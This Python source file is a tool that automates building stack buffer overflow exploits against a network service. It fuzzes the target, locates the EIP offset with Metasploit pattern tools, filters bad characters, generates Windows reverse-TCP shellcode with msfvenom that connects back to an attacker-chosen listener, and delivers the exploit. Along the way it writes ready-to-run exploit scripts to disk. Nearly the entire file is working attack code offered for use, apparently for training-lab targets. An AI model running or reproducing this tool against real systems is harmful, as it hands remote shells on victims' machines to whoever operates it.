#!/usr/bin/python3

import socket, sys, json, argparse, subprocess, re, binascii

class common:

    def __init__(self, os, lcl_ip, lcl_port, dst_ip, dst_port, buffer_zone, **kwargs):

        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.lcl_ip = lcl_ip
        self.lcl_port = lcl_port
        self.bad_hex_chars = []

        if os == "Windows":
            self.newline = "\r\n"

        elif os == "Linux" or os == "Unix":
            self.newline = "\n"

        elif os == "OS X":
            self.newline = "\r"

        if "username" in kwargs:
            self.username = kwargs["username"]

        if "password" in kwargs:
            self.password = kwargs["password"]

        if "data" in kwargs:
            self.data = kwargs["data"]

        if "authentication" in kwargs:
            self.authentication = True

        else:
            self.authentication = False

        self.buffer_zone = buffer_zone
        self.data_ids = []

    def create_python(self, customised_data, title):

        if title != "":
            data = ["#!/usr/bin/python3\n", "import sys, socket\n"]
            data += customised_data
            data_string = '\n'.join(data)
            File_Name = f"BOF-{self.dst_ip}-{self.dst_port}-{title}.py"
            file = open(File_Name, 'w')
            file.write(data_string)
            file.close()

    def send_data(self, buffer_data, data_id, current_output_data, title):
        print(f"[+] Binding to {self.dst_ip}:{str(self.dst_port)}.")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.dst_ip, self.dst_port))

        if data_id not in self.data_ids:

            if data_id == 1:
                current_output_data.extend(["    try:", "        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)", f"        s.connect(({self.dst_ip}, {self.dst_port}))"])

            else:
                current_output_data.extend(["try:", "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)", f"    s.connect(({self.dst_ip}, {self.dst_port}))"])

        def Output_Formatter(self, data_id, to_input, is_bof):

            if is_bof:

                if type(to_input) == bytes:
                    to_input = to_input.decode()

                if data_id == 1:
                    to_input = "b\"" + to_input + "\" + fuzz_buff + b\"" + "\\r\\n\""

                else:
                    to_input = "b\"" + to_input + "\" + buff_data + b\"" + "\\r\\n\""

            if data_id not in self.data_ids:

                if data_id == 1:
                    current_output_data.extend(["        s.recv(1024)", f"        s.send({to_input})"])

                else:
                    current_output_data.extend(["    s.recv(1024)", f"    s.send({to_input})"])

        if type(buffer_data) == str:
            current_username = ""
            current_password = ""
            current_data = ""

            if self.buffer_zone == "username":
                current_username = self.username + buffer_data

            elif self.buffer_zone == "password":
                current_password = self.password + buffer_data

            elif self.buffer_zone == "data":
                current_data = self.data + buffer_data

            print("[+] Sending Payload.")
            rcv_data = s.recv(1024)

            if current_username != "":
                User_String = current_username + self.newline
                s.send(User_String.encode())
                Output_Formatter(self, data_id, self.username.encode(), True)

            elif current_password != "":
                User_String = self.username + self.newline
                s.send(User_String.encode())
                Output_Formatter(self, data_id, str(User_String.encode()), False)
                rcv_data = s.recv(1024)
                Pass_String = current_password + self.newline
                s.send(Pass_String.encode())
                Output_Formatter(self, data_id, self.password.encode(), True)

            elif current_data != "" and self.authentication:
                User_String = self.username + self.newline
                s.send(User_String.encode())
                Output_Formatter(self, data_id, str(User_String.encode()), False)
                rcv_data = s.recv(1024)
                Pass_String = self.password + self.newline
                s.send(Pass_String.encode())
                Output_Formatter(self, data_id, str(Pass_String.encode()), False)
                rcv_data = s.recv(1024)
                Data_String = current_data + self.newline
                s.send(Data_String.encode())
                Output_Formatter(self, data_id, self.data.encode(), True)

            elif current_data != "" and not self.authentication:
                Data_String = current_data + self.newline
                s.send(Data_String.encode())
                Output_Formatter(self, data_id, self.data.encode(), True)

        elif type(buffer_data) == bytes:
            current_username = b""
            current_password = b""
            current_data = b""

            if self.buffer_zone == "username":
                current_username = self.username.encode() + buffer_data

            elif self.buffer_zone == "password":
                current_password = self.password.encode() + buffer_data

            elif self.buffer_zone == "data":
                current_data = self.data.encode() + buffer_data

            print("[+] Sending Payload.")
            rcv_data = s.recv(1024)

            if current_username != b"":
                User_String = current_username + self.newline.encode()
                s.send(User_String)
                Output_Formatter(self, data_id, self.username.encode(), True)

            elif current_password != b"":
                User_String = self.username.encode() + self.newline.encode()
                s.send(User_String)
                Output_Formatter(self, data_id, str(User_String), False)
                rcv_data = s.recv(1024)
                Pass_String = current_password + self.newline.encode()
                s.send(Pass_String)
                Output_Formatter(self, data_id, self.password.encode(), True)

            elif current_data != b"" and self.authentication:
                User_String = self.username.encode() + self.newline.encode()
                s.send(User_String)
                Output_Formatter(self, data_id, str(User_String), False)
                rcv_data = s.recv(1024)
                Pass_String = self.password.encode() + self.newline.encode()
                s.send(Pass_String)
                Output_Formatter(self, data_id, str(Pass_String), False)
                rcv_data = s.recv(1024)
                Data_String = current_data + self.newline.encode()
                s.send(Data_String)     
                Output_Formatter(self, data_id, self.data.encode(), True)

            elif current_data != b"" and not self.authentication:
                rcv_data = s.recv(1024)
                Data_String = current_data + self.newline.encode()
                s.send(Data_String)
                Output_Formatter(self, data_id, self.data.encode(), True)

        rcv_data = s.recv(1024)
        Quit_String = "QUIT" + self.newline
        s.send(Quit_String.encode())
        s.close()
        Output_Formatter(self, data_id, str(Quit_String.encode()), False)

        if data_id not in self.data_ids:

            if data_id == 1:
                current_output_data.extend([f"        s.close()\n", "    except Exception as e:", "        sys.exit(f\"[-] {e}.\")"])

            else:
                current_output_data.extend([f"    s.close()\n", "except Exception as e:", "    sys.exit(f\"[-] {e}.\")"])

            self.data_ids.append(data_id)
            self.create_python(current_output_data, title)

    def fuzzer(self):
        input("[i] Fuzzing about to commence. Please ensure the target application is running and your debugger is attached, then hit enter to continue. Once commenced, if the fuzzer freezes on a number, please close your debugger to allow this script to continue. This number will be used to determine the length of the buffer. ")
        buffer = ["A"]
        counter = 100
        Fuzzer_Output_Data = ["buffer = [b\"A\"]", "counter = 100\n", "while len(buffer) <= 30:", "    buffer.append(b\"A\" * counter)", "    counter = counter + 200\n", "for fuzz_buff in buffer:", "    print(f\"Fuzzing with {len(fuzz_buff)} byte(s).\")\n"]

        while len(buffer) <= 30:
            buffer.append("A" * counter)
            counter = counter + 200
            
        for fuzz_buff in buffer:
            print(f"Fuzzing with {len(fuzz_buff)} byte(s).")

            try:
                self.send_data(fuzz_buff, 1, Fuzzer_Output_Data, "Fuzzer")

            except ConnectionRefusedError:
                print(f"Fuzzing broke at with {len(fuzz_buff)} bytes.")
                self.buff_length = len(fuzz_buff)
                break

            except ConnectionResetError:
                print(f"Fuzzing broke at with {len(fuzz_buff)} bytes.")
                self.buff_length = len(fuzz_buff)
                break

    def send_pattern(self):
        input("[i] Pattern about to be sent out, please restart the target service and the associated debugger. Press enter to continue once complete. ")
        pattern = subprocess.run(['/usr/share/metasploit-framework/ruby', '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb', '-l', str(self.buff_length)], stdout=subprocess.PIPE)
        pattern = pattern.stdout.decode('utf-8')
        pattern_strip = pattern.strip("\n")
        self.send_data(pattern, 2, [f"buff_data = b\"{pattern_strip}\"\n"], "Send-Pattern.")
        pattern_offset_value = input("[+] Please provide the 4 hexadecimal characters (8 regular characters) that make up the EIP register. ")

        while len(pattern_offset_value) != 8:
            pattern_offset_value = input("[i] Invalid string supplied. Please provide the 4 hexadecimal characters (8 regular characters) that make up the EIP register. ")

        pattern_offset = subprocess.run(['/usr/share/metasploit-framework/ruby', '/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb', '-q', pattern_offset_value], stdout=subprocess.PIPE)
        current_init_buff = pattern_offset.stdout.decode('utf-8')
        Offset_Regex = re.search(r"\[\*\]\sExact\smatch\sat\soffset\s(\d+)\n", current_init_buff)

        while not Offset_Regex:
            pattern_offset_value = input("[i] Invalid string supplied. Please provide the 4 hexadecimal characters (8 regular characters) that make up the EIP register. ")
            current_init_buff = pattern_offset.stdout.decode('utf-8')
            Offset_Regex = re.search(r"\[\*\]\sExact\smatch\sat\soffset\s(\d+)\n", current_init_buff)

        if Offset_Regex:
            self.init_buff = Offset_Regex.group(1)

    def send_pattern_offset_confirmation(self):
        Fuzzer_Output_Data = [f"buff_data = b\"A\" * {self.init_buff}", "buff_data += b\"B\" * 4", f"buff_data += b\"C\" * ({self.buff_length} - 4 - {self.init_buff})\n"]
        input("[i] Confirmation A + B + C Confirmation about to be sent out, please restart the target service and the associated debugger. Press enter to continue once complete. ")
        buff_data = "A" * int(self.init_buff)
        buff_data += "B" * 4
        buff_data += "C" * (int(self.buff_length) - 4 - int(self.init_buff))
        self.send_data(buff_data, 3, Fuzzer_Output_Data, "Offset-Confirmation")
        input("[i] Please ensure the EIP register now has 4 \"B\'s\" (42424242). Press enter to continue once complete. ")

    def send_full_hex_char_list(self):
        input("[i] Full hex character list is about to be sent out please restart the target service and the associated debugger. Press enter to continue once complete. ")
        Hex_Chars = ['00', '01', '02', '03', '04', '05', '06', '07', '08', '09', '0a', '0b', '0c', '0d', '0e', '0f', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '1a', '1b', '1c', '1d', '1e', '1f', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '2a', '2b', '2c', '2d', '2e', '2f', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '3a', '3b', '3c', '3d', '3e', '3f', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '4a', '4b', '4c', '4d', '4e', '4f', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '5a', '5b', '5c', '5d', '5e', '5f', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '6a', '6b', '6c', '6d', '6e', '6f', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '7a', '7b', '7c', '7d', '7e', '7f', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '8a', '8b', '8c', '8d', '8e', '8f', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '9a', '9b', '9c', '9d', '9e', '9f', 'a0', 'a1', 'a2', 'a3', 'a4', 'a5', 'a6', 'a7', 'a8', 'a9', 'aa', 'ab', 'ac', 'ad', 'ae', 'af', 'b0', 'b1', 'b2', 'b3', 'b4', 'b5', 'b6', 'b7', 'b8', 'b9', 'ba', 'bb', 'bc', 'bd', 'be', 'bf', 'c0', 'c1', 'c2', 'c3', 'c4', 'c5', 'c6', 'c7', 'c8', 'c9', 'ca', 'cb', 'cc', 'cd', 'ce', 'cf', 'd0', 'd1', 'd2', 'd3', 'd4', 'd5', 'd6', 'd7', 'd8', 'd9', 'da', 'db', 'dc', 'dd', 'de', 'df', 'e0', 'e1', 'e2', 'e3', 'e4', 'e5', 'e6', 'e7', 'e8', 'e9', 'ea', 'eb', 'ec', 'ed', 'ee', 'ef', 'f0', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'fa', 'fb', 'fc', 'fd', 'fe', 'ff']
        Formatted_Hex_Chars = binascii.unhexlify(''.join(Hex_Chars))
        Formatted_Hex_Char_String = "\\x" + "\\x".join(Hex_Chars)
        Fuzzer_Output_Data = [f"buff_data = b\"A\" * {self.init_buff}", "buff_data += b\"B\" * 4", f"buff_data += b\"{Formatted_Hex_Char_String}\"", f"buff_data += b\"C\" * ({self.buff_length} - {len(Formatted_Hex_Chars)} - 4 - {self.init_buff})\n"]
        buff_data = b"A" * int(self.init_buff)
        buff_data += b"B" * 4
        buff_data += Formatted_Hex_Chars
        buff_data += b"C" * (int(self.buff_length) - len(Formatted_Hex_Chars) - 4 - int(self.init_buff))
        self.send_data(buff_data, 4, Fuzzer_Output_Data, "Full-Hex-List")
        Char_to_remove = input("[?] Would you like to remove any hex characters and resend the ammended list? (I.e. 00, 000a). Leave blank to continue to the next step. ")
        Iterator = 0

        while Char_to_remove != "":
            Hex_Regex = re.search(r"[0-9a-fA-F]+", Char_to_remove)

            while not Hex_Regex or len(Char_to_remove) % 2 != 0:
                Char_to_remove = input("[?] Invalid character or set of characters supplied. Please try again following the 2 character notation followed by the hex value (a0). ")

            if Hex_Regex:
                Chars_to_remove = [Char_to_remove[i:i+2] for i in range(0, len(Char_to_remove), 2)]

                try:
                    for char in Chars_to_remove:
                        Hex_Chars.remove(char.lower())
                        Formatted_Hex_Chars = binascii.unhexlify(''.join(Hex_Chars))
                        Fuzzer_Output_Data = [f"buff_data = b\"A\" * {self.init_buff}", "buff_data += b\"B\" * 4", f"buff_data += b\"{Formatted_Hex_Char_String}\"", f"buff_data += b\"C\" * ({self.buff_length}) - {len(Formatted_Hex_Chars)} - 4 - {self.init_buff})"]
                        self.bad_hex_chars.append(char.lower())

                except Exception as e:
                    print(f"[i] Informational error: {e}.")

                input("[i] Amended hex character list is about to be sent out please restart the target service and the associated debugger. Press enter to continue once complete. ")
                buff_data = b"A" * int(self.init_buff)
                buff_data += b"B" * 4
                buff_data += Formatted_Hex_Chars
                buff_data += b"C" * (int(self.buff_length) - len(Formatted_Hex_Chars) - 4 - int(self.init_buff))
                self.send_data(buff_data, 4, Fuzzer_Output_Data, f"Consolidated-Hex-List-{str(Iterator)}")
                Iterator += 1
                Char_to_remove = input("[?] Would you like to remove any hex characters and resend the ammended list? (I.e. 00, 000a). Leave blank to continue to the next step. ")

    def ask_for_instruction(self):
        Answer = input("[?] Have you received any data since last restarting the service and the debugger? If you have not, answer yes (Y) and I will resend dummy data, to use for the next step. (Y/N): ")

        while Answer not in ["Y", "y", "N", "n"]:
            Answer = input("[-] Invalid response, please either provide a y or an n in response to the above question (Y/N): ")

        if Answer == "Y":
            input("[i] Dummy data about to be sent out, please restart the target service and the associated debugger. Press enter to continue once complete. ")
            buff_data = "A" * int(self.init_buff)
            buff_data += "B" * 4
            buff_data += "C" * (int(self.buff_length) - 4 - int(self.init_buff))
            self.send_data(buff_data, 0, [], "")

        Instruction = input("[i] Please provide the jmp esp or push esp instruction, in it's 8 digit form (I.e. 5f4a358f). ")
        Instruction_Regex = re.search(r"[0-9a-fA-F]{8}", Instruction)

        while not Instruction_Regex:
            Instruction = input("[i] Please provide a vaild jmp esp or push esp instruction, in it's 8 digit form (I.e. 5f4a358f). ")
            Instruction_Regex = re.search(r"[0-9a-fA-F]{8}", Instruction)

        Byte_Array = [Instruction[i:i+2] for i in range(0, len(Instruction), 2)]
        Byte_Array.reverse()
        Byte_Array_Little_Endian = ''.join(Byte_Array)
        self.X_Byte_Array_Little_Endian = '\\x' + '\\x'.join(Byte_Array)
        print(f"[+] Instruction given: {Instruction}. Instruction converted to x86 Little Endian: {Byte_Array_Little_Endian}")
        self.Instruction = binascii.unhexlify(Byte_Array_Little_Endian)

    def generate_shellcode(self):
        print("[+] Generating shellcode, please be patient.")
        print_bhc = '\\x' + '\\x'.join(self.bad_hex_chars)
        print(f'[+] Generating shellcode using the command: msfvenom -p windows/shell/reverse_tcp LHOST={self.lcl_ip} LHOST={self.lcl_port} -b \'{print_bhc}\' -f py')
        cmd = subprocess.run(['msfvenom', '-p', 'windows/shell/reverse_tcp', f'LHOST={self.lcl_ip}', f'LPORT={self.lcl_port}', '-b', f"\'{print_bhc}\'", '-f', 'py'], stdout=subprocess.PIPE)
        shellcode_with_mess = cmd.stdout.decode()
        shellcode_with_mess = shellcode_with_mess.replace("buf =  b\"\"", "")
        shellcode_with_mess = shellcode_with_mess.replace("buf += b\"", "")
        shellcode_with_mess = shellcode_with_mess.replace("\"", "")
        shellcode_with_mess = shellcode_with_mess.replace("\n", "")
        self.out_py_shellcode = shellcode_with_mess
        shellcode_with_mess = shellcode_with_mess.replace("\\x", "")
        self.shellcode = binascii.unhexlify(shellcode_with_mess)

    def exploit(self):
        input(f"[i] Exploit ready to deliver, please restart the target service. In addition, please set up a listener on TCP port {self.lcl_port}. Press enter to continue once complete. ")
        buff_data = b"A" * int(self.init_buff)
        buff_data += self.Instruction
        buff_data += b"\x90" * 30
        buff_data += self.shellcode
        buff_data += b"C" * (int(self.buff_length) - len(buff_data))
        Fuzzer_Output_Data = [f"buff_data = b\"A\" * {self.init_buff}", f"buff_data += b\"{self.X_Byte_Array_Little_Endian}\"", "buff_data += b\"\\x90\" * 30", f"buff_data += b\"{self.out_py_shellcode}\"", f"buff_data += b\"C\" * ({int(self.buff_length)} - {len(buff_data)})\n"]
        self.send_data(buff_data, 5, Fuzzer_Output_Data, "Finalised-Exploit")

if __name__ == '__main__':

    try:
        Valid_OS = ["Windows", "Linux", "Unix", "OS X"]
        Parser = argparse.ArgumentParser(description='Tool automatically generates simple buffer overflow exploits.')
        Parser.add_argument('-j', '--jsonfile', help='This option specifies the location of the json markup file.')
        Parser.add_argument('-dh', '--destinationhost', help='IP address or hostname of the server the target service is running on.')
        Parser.add_argument('-dp', '--destinationport', type=int, help='Port of the target service is running on.')
        Parser.add_argument('-lh', '--localhost', help='IP address or hostname of the host you want to receive the shell on.')
        Parser.add_argument('-lp', '--localport', type=int, help='A port not in use of the host you want to receive the shell on.')
        Parser.add_argument('-o', '--os', help='The operating system of the server the target service is running on.')
        Arguments = Parser.parse_args()

        if not Arguments.jsonfile or not Arguments.destinationhost or not Arguments.destinationport or not Arguments.localhost or not Arguments.localport:
            sys.exit("[-] One or more required arguments is missing.")

        if Arguments.os not in Valid_OS:
            Valid_OS_String = "\n".join(Valid_OS)
            sys.exit(f"[-] Please specify your OS from the following list: \n{Valid_OS_String}.")

        json_data = {}

        try:

            with open(Arguments.jsonfile) as json_file:
                text = json_file.read()
                json_data = json.loads(text)

        except Exception as e:
            sys.exit(f"[-] Failed to open file. Error: {e}.")

        if "username" in json_data:

            if "INSERT_BUFFER" in json_data["username"]:
                BOF_Object = common(Arguments.os, Arguments.localhost, Arguments.localport, Arguments.destinationhost, Arguments.destinationport, "username", username=json_data["username"][0], authentication=True)

            else:

                if "password" in json_data:

                    if "INSERT_BUFFER" in json_data["password"]:
                        BOF_Object = common(Arguments.os, Arguments.localhost, Arguments.localport, Arguments.destinationhost, Arguments.destinationport, "password", username=json_data["username"][0], password=json_data["password"][0], authentication=True)

                    else:

                        if "data" in json_data:

                            if "INSERT_BUFFER" in json_data["data"]:
                                BOF_Object = common(Arguments.os, Arguments.localhost, Arguments.localport, Arguments.destinationhost, Arguments.destinationport, "data", username=json_data["username"][0], password=json_data["password"][0], data=json_data["data"][0], authentication=True)

        else:

            if "data" in json_data:

                if "INSERT_BUFFER" in json_data["data"]:
                    BOF_Object = common(Arguments.os, Arguments.localhost, Arguments.localport, Arguments.destinationhost, Arguments.destinationport, "data", data=json_data["data"][0])

        print("[+] Buffer Overflow object initiated. Sending initial payload in increments.")
        BOF_Object.fuzzer()
        BOF_Object.send_pattern()
        BOF_Object.send_pattern_offset_confirmation()
        BOF_Object.send_full_hex_char_list()
        BOF_Object.ask_for_instruction()
        BOF_Object.generate_shellcode()
        BOF_Object.exploit()

    except Exception as e:
        sys.exit(f"[-] {e}.")